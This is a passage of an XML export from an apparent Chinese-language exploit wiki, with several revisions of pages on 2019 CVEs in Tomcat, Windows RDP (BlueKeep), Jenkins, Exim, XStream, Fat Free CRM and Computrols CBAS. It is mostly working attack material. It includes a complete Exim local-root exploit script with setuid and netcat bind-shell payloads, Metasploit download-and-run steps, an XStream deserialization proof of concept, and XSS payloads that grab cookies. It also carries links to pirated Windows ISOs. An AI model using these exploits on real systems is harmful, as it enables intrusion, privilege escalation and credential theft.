# Call the following URLs to observe the XSS. You may need to use FireFox. Observe the difference between the "echo" directive which escapes properly and the "printenv" directive which does not escape properly
http://localhost:8080/ssi/printenv.shtml?%3Cbr/%3E%3Cbr/%3E%3Ch1%3EXSS%3C/h1%3E%3Cbr/%3E%3Cbr/%3E
http://localhost:8080/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E
&lt;/pre&gt;</text>
      <sha1>pkit8m38cfejsicojgr3qvblqu373dd</sha1>
    </revision>
    <revision>
      <id>7176</id>
      <parentid>7175</parentid>
      <timestamp>2021-07-13T14:20:56Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>7176</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1593" sha1="8u2oq0v3bs8emab83g3exc6jorfhxfk" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
Version: Apache Tomcat 9.0.0.M1 to 9.0.0.17, 8.5.0 to 8.5.39, and 7.0.0 to 7.0.93


==XSS==
&lt;pre&gt;
# Exploit Title: Apache Tomcat 9.0.0.M1 - Cross-Site Scripting (XSS)
# Date: 05/21/2019
# Exploit Author: Central InfoSec
# Version: Apache Tomcat 9.0.0.M1 to 9.0.0.17, 8.5.0 to 8.5.39, and 7.0.0 to 7.0.93
# CVE : CVE-2019-0221

# Requirements:

# SSI support must be enabled within Apache Tomcat. SSI support is not enabled by default.

# A file (usually "*.shtml") with the "printenv" SSI directive must exist within the web application.

# The file must be accessible.



# Proof of Concept:

# Install a Java Runtime Environment (JRE)

# Download a vulnerable version of Tomcat and extract the contents

# Modify line 19 of the conf\context.xml file to globally enable privileged context
Context privileged="true"&gt;

# Modify conf\web.xml to enable the SSI Servlet as per the Apache Tomcat User Guide

# Put the following code in "webapps/ROOT/ssi/printenv.shtml"
&lt;html&gt;
  &lt;body&gt;
    Echo: &lt;!-- #echo var="QUERY_STRING_UNESCAPED" --&gt; &lt;br/&gt; &lt;br/&gt;
    Printenv: &lt;!-- #printenv --&gt;
  &lt;/body&gt;
&lt;/html&gt;

# Run Tomcat
cd bin
catalina run

# Call the following URLs to observe the XSS. You may need to use FireFox. Observe the difference between the "echo" directive which escapes properly and the "printenv" directive which does not escape properly
http://localhost:8080/ssi/printenv.shtml?%3Cbr/%3E%3Cbr/%3E%3Ch1%3EXSS%3C/h1%3E%3Cbr/%3E%3Cbr/%3E
http://localhost:8080/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E
&lt;/pre&gt;</text>
      <sha1>8u2oq0v3bs8emab83g3exc6jorfhxfk</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-0708 Windows RCE遠程控制漏洞</title>
    <ns>0</ns>
    <id>8</id>
    <revision>
      <id>14</id>
      <timestamp>2021-02-26T07:05:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>建立內容為「==影響版本：== Windows 7  Windows Server 2008 R2  Windows Server 2008  Windows 2003  Windows XP   ==環境：== Windows7： ed2k://|file|cn_windows_7_ultimat…」的新頁面</comment>
      <origin>14</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1469" sha1="st14pez2txmpki9mg8ajopbhjl8ev65" xml:space="preserve">==影響版本：==
Windows 7

Windows Server 2008 R2

Windows Server 2008

Windows 2003

Windows XP


==環境：==
Windows7：
ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/


windows 2008 R2：
ed2k://|file|cn_windows_server_2008_r2_hpc_x64_dvd_552764.iso|2959194112|1941C1937261AB4F6F9A28F86FE3DAC0|/


==利用代碼：==
wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rb
 
wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rb
 
wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb
 
wget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb


cp rdp.rb /usr/share/metasploit-framework/lib/msf/core/exploit/
 
cp rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/
 
cp cve_2019_0708_bluekeep_rce.rb /usr/share/metasploit-framework/modules/exploits/windows/rdp/

cp cve_2019_0708_bluekeep.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/


==MSF利用：==
&lt;code&gt;
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce 

set rhosts 192.168.9.132

set rport 3389

set target 3

exploit
&lt;/code&gt;</text>
      <sha1>st14pez2txmpki9mg8ajopbhjl8ev65</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-1003000 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>185</id>
    <revision>
      <id>290</id>
      <timestamp>2021-03-09T08:16:02Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt; &lt;translate&gt; 實際影響版本及編號：CVE-2019-1003000 (Script Security), CVE-2019-1003001 (Pipeline: Groovy), CVE-2019-1003002 (Pipeline: Declarative)  擁..."</comment>
      <origin>290</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="581" sha1="bkwx9gxovid4zm8t8twqih9x3w5fcuw" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
實際影響版本及編號：CVE-2019-1003000 (Script Security), CVE-2019-1003001 (Pipeline: Groovy), CVE-2019-1003002 (Pipeline: Declarative)

擁有Overall/Read 權限的用戶可以繞過沙盒保護，在jenkins可以執行任意代碼。此漏洞需要一個賬號密碼和一個存在的job。

受影響插件版本：

Pipeline: Declarative 插件 &lt;= 1.3.4。 

Pipeline: Groovy 插件 &lt;= 2.61。 

Script Security 插件 &lt;= 1.49。

下載環境和利用代碼：
&lt;/translate&gt;
 https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc.git</text>
      <sha1>bkwx9gxovid4zm8t8twqih9x3w5fcuw</sha1>
    </revision>
    <revision>
      <id>291</id>
      <parentid>290</parentid>
      <timestamp>2021-03-09T08:16:13Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>291</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="658" sha1="0jzgc8cnezxrsgfhvmehbjqo7d5loz5" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
&lt;!--T:1--&gt;
實際影響版本及編號：CVE-2019-1003000 (Script Security), CVE-2019-1003001 (Pipeline: Groovy), CVE-2019-1003002 (Pipeline: Declarative)

&lt;!--T:2--&gt;
擁有Overall/Read 權限的用戶可以繞過沙盒保護，在jenkins可以執行任意代碼。此漏洞需要一個賬號密碼和一個存在的job。

&lt;!--T:3--&gt;
受影響插件版本：

&lt;!--T:4--&gt;
Pipeline: Declarative 插件 &lt;= 1.3.4。 

&lt;!--T:5--&gt;
Pipeline: Groovy 插件 &lt;= 2.61。 

&lt;!--T:6--&gt;
Script Security 插件 &lt;= 1.49。

&lt;!--T:7--&gt;
下載環境和利用代碼：
&lt;/translate&gt;
 https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc.git</text>
      <sha1>0jzgc8cnezxrsgfhvmehbjqo7d5loz5</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-1003000 遠程代碼執行漏洞/zh-hant</title>
    <ns>0</ns>
    <id>3073</id>
    <revision>
      <id>3574</id>
      <timestamp>2021-05-26T13:54:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "Pipeline: Groovy 插件 &lt;= 2.61。"</comment>
      <origin>3574</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="556" sha1="fdj9glsluojmyaqrj8snfu2wr339lzl" xml:space="preserve">&lt;languages  /&gt;
實際影響版本及編號：CVE-2019-1003000 (Script Security), CVE-2019-1003001 (Pipeline: Groovy), CVE-2019-1003002 (Pipeline: Declarative)

擁有Overall/Read 權限的用戶可以繞過沙盒保護，在jenkins可以執行任意代碼。此漏洞需要一個賬號密碼和一個存在的job。

受影響插件版本：

Pipeline: Declarative 插件 &lt;= 1.3.4。 

Pipeline: Groovy 插件 &lt;= 2.61。 

Script Security 插件 &lt;= 1.49。

下載環境和利用代碼：
 https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc.git</text>
      <sha1>fdj9glsluojmyaqrj8snfu2wr339lzl</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-1003005遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>186</id>
    <revision>
      <id>292</id>
      <timestamp>2021-03-09T08:18:02Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt; &lt;translate&gt; ==影響版本== &lt;/translate&gt; &lt;pre&gt; Jenkins 2.53 Jenkins 2.122 Jenkins 2.137 Jenkins 2.138 啟用匿名讀取 Jenkins 2.152 啟用匿名讀取 Jenki..."</comment>
      <origin>292</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="327" sha1="69aojwo1lsckc4ea5hvcoiuu9nn5eoy" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
&lt;pre&gt;
Jenkins 2.53
Jenkins 2.122
Jenkins 2.137
Jenkins 2.138 啟用匿名讀取
Jenkins 2.152 啟用匿名讀取
Jenkins 2.153 啟用匿名讀取
Script Security Plugin 1.43
Script Security Plugin 1.48
&lt;/pre&gt;

==EXP==
https://github.com/orangetw/awesome-jenkins-rce-2019</text>
      <sha1>69aojwo1lsckc4ea5hvcoiuu9nn5eoy</sha1>
    </revision>
    <revision>
      <id>293</id>
      <parentid>292</parentid>
      <timestamp>2021-03-09T08:18:12Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>293</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="338" sha1="cal9cimc54jbaejqylzlj4qlmxx5ich" xml:space="preserve">&lt;languages  /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Jenkins 2.53
Jenkins 2.122
Jenkins 2.137
Jenkins 2.138 啟用匿名讀取
Jenkins 2.152 啟用匿名讀取
Jenkins 2.153 啟用匿名讀取
Script Security Plugin 1.43
Script Security Plugin 1.48
&lt;/pre&gt;

==EXP==
https://github.com/orangetw/awesome-jenkins-rce-2019</text>
      <sha1>cal9cimc54jbaejqylzlj4qlmxx5ich</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-1003005遠程代碼執行漏洞/zh-cn</title>
    <ns>0</ns>
    <id>3175</id>
    <revision>
      <id>3683</id>
      <timestamp>2021-05-31T01:46:16Z</timestamp>
      <contributor>
        <username>Wosk0x01</username>
        <id>272</id>
      </contributor>
      <comment>Created page with "CVE-2019-1003005远程代码执行漏洞"</comment>
      <origin>3683</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="363" sha1="2ewur2npzsda8tp5o7io0k6x35tatsw" xml:space="preserve">&lt;languages  /&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==影響版本==
&lt;/div&gt;
&lt;pre&gt;
Jenkins 2.53
Jenkins 2.122
Jenkins 2.137
Jenkins 2.138 啟用匿名讀取
Jenkins 2.152 啟用匿名讀取
Jenkins 2.153 啟用匿名讀取
Script Security Plugin 1.43
Script Security Plugin 1.48
&lt;/pre&gt;

==EXP==
https://github.com/orangetw/awesome-jenkins-rce-2019</text>
      <sha1>2ewur2npzsda8tp5o7io0k6x35tatsw</sha1>
    </revision>
    <revision>
      <id>3685</id>
      <parentid>3683</parentid>
      <timestamp>2021-05-31T01:46:41Z</timestamp>
      <contributor>
        <username>Wosk0x01</username>
        <id>272</id>
      </contributor>
      <comment>Created page with "==影响版本=="</comment>
      <origin>3685</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="302" sha1="hfcvlqb7h5z9n917p39gxfnq2ajpcnt" xml:space="preserve">&lt;languages  /&gt;
==影响版本==
&lt;pre&gt;
Jenkins 2.53
Jenkins 2.122
Jenkins 2.137
Jenkins 2.138 啟用匿名讀取
Jenkins 2.152 啟用匿名讀取
Jenkins 2.153 啟用匿名讀取
Script Security Plugin 1.43
Script Security Plugin 1.48
&lt;/pre&gt;

==EXP==
https://github.com/orangetw/awesome-jenkins-rce-2019</text>
      <sha1>hfcvlqb7h5z9n917p39gxfnq2ajpcnt</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-10149 Exim郵箱服務漏洞</title>
    <ns>0</ns>
    <id>340</id>
    <revision>
      <id>509</id>
      <timestamp>2021-03-20T02:34:58Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt; ==POC== &lt;pre&gt;  'RCPT TO "${run{...}}@relaydomain.com"' &lt;/pre&gt;   &lt;pre&gt;  noob+${run{/usr/bin/touch /tmp/hello}}@myserver.com &lt;/pre&gt;"</comment>
      <origin>509</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="144" sha1="gj44zc5zabt51muebm47lqna4fhwjw8" xml:space="preserve">&lt;languages  /&gt;
==POC==
&lt;pre&gt;
 'RCPT TO "${run{...}}@relaydomain.com"'
&lt;/pre&gt;


&lt;pre&gt;
 noob+${run{/usr/bin/touch /tmp/hello}}@myserver.com
&lt;/pre&gt;</text>
      <sha1>gj44zc5zabt51muebm47lqna4fhwjw8</sha1>
    </revision>
    <revision>
      <id>512</id>
      <parentid>509</parentid>
      <timestamp>2021-03-20T13:32:04Z</timestamp>
      <contributor>
        <username>Esonhugh</username>
        <id>17</id>
      </contributor>
      <comment>增加一些信息 并且 加入 poc 的引用</comment>
      <origin>512</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="307" sha1="9vna3m1z3y1tynnjcvxrgkdmuo3mlki" xml:space="preserve">&lt;languages  /&gt;

== '''影响范围''' ==
Exim 版本 4.87 至 4.91 

==POC==
&lt;pre&gt;
 'RCPT TO "${run{...}}@relaydomain.com"'
&lt;/pre&gt;


&lt;pre&gt;
 noob+${run{/usr/bin/touch /tmp/hello}}@myserver.com
&lt;/pre&gt;

== '''引用''' ==
https://github.com/MNEMO-CERT/PoC--CVE-2019-10149_Exim/blob/master/PoC_CVE-2019-10149.py</text>
      <sha1>9vna3m1z3y1tynnjcvxrgkdmuo3mlki</sha1>
    </revision>
    <revision>
      <id>513</id>
      <parentid>512</parentid>
      <timestamp>2021-03-20T13:37:36Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>513</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="307" sha1="iyim48r50awzyi3brnoxkd3xhnez2e1" xml:space="preserve">&lt;languages  /&gt;

== '''影響範圍''' ==
Exim 版本 4.87 至 4.91 

==POC==
&lt;pre&gt;
 'RCPT TO "${run{...}}@relaydomain.com"'
&lt;/pre&gt;


&lt;pre&gt;
 noob+${run{/usr/bin/touch /tmp/hello}}@myserver.com
&lt;/pre&gt;

== '''引用''' ==
https://github.com/MNEMO-CERT/PoC--CVE-2019-10149_Exim/blob/master/PoC_CVE-2019-10149.py</text>
      <sha1>iyim48r50awzyi3brnoxkd3xhnez2e1</sha1>
    </revision>
    <revision>
      <id>1048</id>
      <parentid>513</parentid>
      <timestamp>2021-04-06T15:05:07Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <origin>1048</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3887" sha1="4vsfewoo2epespy5f6rvfkn1na2i78k" xml:space="preserve">&lt;languages  /&gt;

== '''影響範圍''' ==
Exim 版本 4.87 至 4.91 

==POC==
&lt;pre&gt;
 'RCPT TO "${run{...}}@relaydomain.com"'
&lt;/pre&gt;


&lt;pre&gt;
 noob+${run{/usr/bin/touch /tmp/hello}}@myserver.com
&lt;/pre&gt;


==EXP==
&lt;pre&gt;
#!/bin/bash

#
# raptor_exim_wiz - "The Return of the WIZard" LPE exploit
# Copyright (c) 2019 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;
#
# A flaw was found in Exim versions 4.87 to 4.91 (inclusive). 
# Improper validation of recipient address in deliver_message() 
# function in /src/deliver.c may lead to remote command execution.
# (CVE-2019-10149)
#
# This is a local privilege escalation exploit for "The Return 
# of the WIZard" vulnerability reported by the Qualys Security 
# Advisory team.
#
# Credits:
# Qualys Security Advisory team (kudos for your amazing research!)
# Dennis 'dhn' Herrmann (/dev/tcp technique)
#
# Usage (setuid method):
# $ id
# uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]
# $ ./raptor_exim_wiz -m setuid
# Preparing setuid shell helper...
# Delivering setuid payload...
# [...]
# Waiting 5 seconds...
# -rwsr-xr-x 1 root raptor 8744 Jun 16 13:03 /tmp/pwned
# # id
# uid=0(root) gid=0(root) groups=0(root)
#
# Usage (netcat method):
# $ id
# uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]
# $ ./raptor_exim_wiz -m netcat
# Delivering netcat payload...
# Waiting 5 seconds...
# localhost [127.0.0.1] 31337 (?) open
# id
# uid=0(root) gid=0(root) groups=0(root)
#
# Vulnerable platforms:
# Exim 4.87 - 4.91
#
# Tested against:
# Exim 4.89 on Debian GNU/Linux 9 (stretch) [exim-4.89.tar.xz]
#

METHOD="setuid" # default method
PAYLOAD_SETUID='${run{\x2fbin\x2fsh\t-c\t\x22chown\troot\t\x2ftmp\x2fpwned\x3bchmod\t4755\t\x2ftmp\x2fpwned\x22}}@localhost'
PAYLOAD_NETCAT='${run{\x2fbin\x2fsh\t-c\t\x22nc\t-lp\t31337\t-e\t\x2fbin\x2fsh\x22}}@localhost'

# usage instructions
function usage()
{
	echo "$0 [-m METHOD]"
	echo
	echo "-m setuid : use the setuid payload (default)"
	echo "-m netcat : use the netcat payload"
	echo
	exit 1
}

# payload delivery
function exploit()
{
	# connect to localhost:25
	exec 3&lt;&gt;/dev/tcp/localhost/25

	# deliver the payload
	read -u 3 &amp;&amp; echo $REPLY
	echo "helo localhost" &gt;&amp;3
	read -u 3 &amp;&amp; echo $REPLY
	echo "mail from:&lt;&gt;" &gt;&amp;3
	read -u 3 &amp;&amp; echo $REPLY
	echo "rcpt to:&lt;$PAYLOAD&gt;" &gt;&amp;3
	read -u 3 &amp;&amp; echo $REPLY
	echo "data" &gt;&amp;3
	read -u 3 &amp;&amp; echo $REPLY
	for i in {1..31}
	do
		echo "Received: $i" &gt;&amp;3
	done
	echo "." &gt;&amp;3
	read -u 3 &amp;&amp; echo $REPLY
	echo "quit" &gt;&amp;3
	read -u 3 &amp;&amp; echo $REPLY
}

# print banner
echo
echo 'raptor_exim_wiz - "The Return of the WIZard" LPE exploit'
echo 'Copyright (c) 2019 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;'
echo

# parse command line
while [ ! -z "$1" ]; do
	case $1 in
		-m) shift; METHOD="$1"; shift;;
		* ) usage
		;;
	esac
done
if [ -z $METHOD ]; then
	usage
fi

# setuid method
if [ $METHOD = "setuid" ]; then

	# prepare a setuid shell helper to circumvent bash checks
	echo "Preparing setuid shell helper..."
	echo "main(){setuid(0);setgid(0);system(\"/bin/sh\");}" &gt;/tmp/pwned.c
	gcc -o /tmp/pwned /tmp/pwned.c 2&gt;/dev/null
	if [ $? -ne 0 ]; then
		echo "Problems compiling setuid shell helper, check your gcc."
		echo "Falling back to the /bin/sh method."
		cp /bin/sh /tmp/pwned
	fi
	echo

	# select and deliver the payload
	echo "Delivering $METHOD payload..."
	PAYLOAD=$PAYLOAD_SETUID
	exploit
	echo

	# wait for the magic to happen and spawn our shell
	echo "Waiting 5 seconds..."
	sleep 5
	ls -l /tmp/pwned
	/tmp/pwned

# netcat method
elif [ $METHOD = "netcat" ]; then

	# select and deliver the payload
	echo "Delivering $METHOD payload..."
	PAYLOAD=$PAYLOAD_NETCAT
	exploit
	echo

	# wait for the magic to happen and spawn our shell
	echo "Waiting 5 seconds..."
	sleep 5
	nc -v 127.0.0.1 31337

# print help
else
	usage
fi
&lt;/pre&gt;

== '''引用''' ==
https://github.com/MNEMO-CERT/PoC--CVE-2019-10149_Exim/blob/master/PoC_CVE-2019-10149.py</text>
      <sha1>4vsfewoo2epespy5f6rvfkn1na2i78k</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-10173 Xstream 1.4.10遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1172</id>
    <revision>
      <id>1462</id>
      <timestamp>2021-04-10T05:37:37Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==POC== &lt;pre&gt; package com.bigo;  import com.thoughtworks.xstream.XStream;  import java.beans.EventHandler; import java.io.IOException; import java.util.Set; import java.util.T..."</comment>
      <origin>1462</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1633" sha1="km9st2cefcv9ahr29pd5gqq187dtjmh" xml:space="preserve">==POC==
&lt;pre&gt;
package com.bigo;

import com.thoughtworks.xstream.XStream;

import java.beans.EventHandler;
import java.io.IOException;
import java.util.Set;
import java.util.TreeSet;

/**
 * Created by cfchi on 2019/7/26.
 */
public class Main {
    public static String expGen(){
        XStream xstream = new XStream();
        Set&lt;Comparable&gt; set = new TreeSet&lt;Comparable&gt;();
        set.add("foo");
        set.add(EventHandler.create(Comparable.class, new ProcessBuilder("calc"), "start"));
        String payload = xstream.toXML(set);
        System.out.println(payload);
        return payload;
    }
    public static void main(String[] args) throws IOException {
        expGen();
        XStream xStream = new XStream();
        String payload = "&lt;sorted-set&gt;\n" +
                "    &lt;string&gt;foo&lt;/string&gt;\n" +
                "    &lt;dynamic-proxy&gt;\n" +
                "    &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n" +
                "        &lt;handler class=\"java.beans.EventHandler\"&gt;\n" +
                "            &lt;target class=\"java.lang.ProcessBuilder\"&gt;\n" +
                "                &lt;command&gt;\n" +
                "                    &lt;string&gt;cmd.exe&lt;/string&gt;\n" +
                "                    &lt;string&gt;/c&lt;/string&gt;\n" +
                "                    &lt;string&gt;calc&lt;/string&gt;\n" +
                "                &lt;/command&gt;\n" +
                "            &lt;/target&gt;\n" +
                "     &lt;action&gt;start&lt;/action&gt;"+
                "        &lt;/handler&gt;\n" +
                "    &lt;/dynamic-proxy&gt;\n" +
                "&lt;/sorted-set&gt;\n";
       xStream.fromXML(payload);
    }
}
&lt;/pre&gt;</text>
      <sha1>km9st2cefcv9ahr29pd5gqq187dtjmh</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-10226 Fat Free CRM 0.19.0 HTML注入漏洞</title>
    <ns>0</ns>
    <id>1620</id>
    <revision>
      <id>2024</id>
      <timestamp>2021-05-02T04:46:10Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Fat Free CRM v0.19.0 - HTML Injection # Date: 2019-03-20 # Exploit Author: Ismail Tasdelen # Vendor Homepage: http://www.fatfreecrm.com/ # Sourc..."</comment>
      <origin>2024</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2418" sha1="7ydyzy98h6qlcuqo9cnrg2oox1x78se" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Fat Free CRM v0.19.0 - HTML Injection
# Date: 2019-03-20
# Exploit Author: Ismail Tasdelen
# Vendor Homepage: http://www.fatfreecrm.com/
# Source Code : https://github.com/fatfreecrm
# Software :  Fat Free CRM
# Product Version:  v0.19.0
# Vulnerability Type : Code Injection
# Vulnerability : HTML Injection
# CVE : CVE-2019-10226

POST /comments HTTP/1.1
Host: XXXXXXXXXXXX
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: */*;q=0.5, text/javascript, application/javascript, application/ecmascript, application/x-ecmascript
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: XXXXXXXXXXXX
X-CSRF-Token: xikVMkG4Le6llfW44C7CQZsD3Qz7bDgbMCbPFCtMjbzJFTfTF5SOx6xPhFDB6EL8MFNSNspHI51gZqz4V7QNMQ==
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 162
DNT: 1
Connection: close
Cookie: _fat_free_crm_session=b25NTU15QnR0ZGQvOFZiNXptdE81VXNDQUZ1TjYxUi9ucHhPSmxDb2lHS2gzZGhGY0V3Um5pT2NOWVZVZmd0T0pnUjI2UjNGeTJyOEt6ajBpMGRxcHJtT2ZyRnJkL0N3R1VrQlJCMXU1TGg5TkZEaHVubW5nM3duZzROQ0xrekRHWjBNWGpaQjF2TVgyaDR6QXUwS1lGdVEyQk5xN2dqVVVkYlhaV0JTY05DcncrdHNSZWp6dWRWSkQ2V2ZKb1NQRFAwMVhXZFZkQjBFOTJOSUZoQWc5S3J0SnIvS1hNNWVtTGtnd1EwRWJRVS9aWkpUZVhHWUJXQm5EYURLNG1jSEUrRVM5WFZFd05RSjR3ZEViQnViamZvY0RNRXMzZzJyUTZCL2E3YjhEVFVBRmFQOXhyaDd3Vnh5alRSTGlnYjlKUTVPT2laYzNRRjJIWWRLdGthQklrWFZDdFdrbElsWWlRcTBoQm1OZnRpVGRoVmp1ckhIZkxlVUt1c3M0MWQ2d3k1Uk4rd2dnVFAveDlrcHJza2tCd3BQUEduTENMeUxxOUpQN0tKL2RoU29FNHN6YWlrWndDNHcvRHlSUjd5TUFJVVErUm5tVnhLVVhtRE81cnltcnMvaHFuOXdPclR1NGl1OHVnbFZmdi9iaTJTWndjQzdKTThOc0dtMVp1a3VlQk5IQm04QmZuMVl3OHlOSHdJemllcU50UHZCSElGNTVOK0lCY2VSUHBIT20zcFNsay9PN0c1dWVkTHEzVnQxMUUvaXJRNHNoV2ZXNDNWeHpIbDdaUEJvaTBmaG1Xek0zRk5OZDdwTUZjUk4xaUl2N0hCMysvTFNHN2FNOTRhVGY5QU9Jc2VialV5Z1ovQS9ZUW5LUXRzL2lZQjNyTGVlTWY1QnFuczk1L3cvL25tNXlsTDlOcm5XdEpUYlNZNUhSSDNLZEJDRFZNUWVjcHQ1SjJCT3ArOW9nZDMwTGp1UWhqTm1lUE8wcGNHVVhDaG9adnNJdVZmUTVabDNUQ0JGSXEwdjNxK2xsdjF4Uk1TekVVZmoxM3JLajI5dis2VTlGRW4xVHZBNGY4Z3ZVemRZL1VZTy9ET01Ja3lzUkg1MzNQNUtWNUp2bi92QWVMTU1weUJ4NHV6Q0VjTmpvUlo1bVk4dzUzWDAxRWV5cVpBUkRBU1dveDFkQkdQMTJHMTAtLVl6endaUmJ2SStHeHZmZVUya1JKd0E9PQ%3D%3D--5584247e850cfdc0a8c912a9cc5ffaa1ce34b969

utf8=%E2%9C%93&amp;comment%5Bcommentable_id%5D=143&amp;comment%5Bcommentable_type%5D=Contact&amp;comment%5Bcomment%5D=%22%3E%3Ch1%3EIsmail+Tasdelen%3C%2Fh1%3E&amp;commit=Add+Note
            
&lt;/pre&gt;</text>
      <sha1>7ydyzy98h6qlcuqo9cnrg2oox1x78se</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2019-10846 Computrols CBAS Web XSS漏洞</title>
    <ns>0</ns>
    <id>2052</id>
    <revision>
      <id>2477</id>
      <timestamp>2021-05-05T06:58:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞影響== Computrols CBAS Web&lt;=19.0.0   ==XSS== &lt;pre&gt; POST /cbas/index.php?m=auth&amp;a=verifyid HTTP/1.1  username="&gt;&lt;script&gt;confirm(document.cookie)&lt;/script&gt;&amp;submit_butto..."</comment>
      <origin>2477</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="572" sha1="roig8q13x64ofo2eglul2utb8wi2qut" xml:space="preserve">==漏洞影響==
Computrols CBAS Web&lt;=19.0.0


==XSS==
&lt;pre&gt;
POST /cbas/index.php?m=auth&amp;a=verifyid HTTP/1.1

username="&gt;&lt;script&gt;confirm(document.cookie)&lt;/script&gt;&amp;submit_button=Send+Me+a+New+Password+Via+Email
&lt;/pre&gt;


&lt;pre&gt;
POST /cbas/index.php?m=auth&amp;a=login HTTP/1.1

username="&gt;&lt;marquee&gt;htmlinjection&lt;/marquee&gt;&amp;password=&amp;challenge=60753c1b5e449de80e21472b5911594d&amp;response=e16371917371b8b70529737813840c62
&lt;/pre&gt;



&lt;pre&gt;
GET /cbas/index.php?m=auth&amp;a=login&amp;username="&gt;&lt;marquee&gt;my milkshake brings all the boys to the yard.&lt;/marquee&gt;&amp;password=damn_right HTTP/1.1
&lt;/pre&gt;</text>
      <sha1>roig8q13x64ofo2eglul2utb8wi2qut</sha1>
    </revision>
  </page>
  <page>
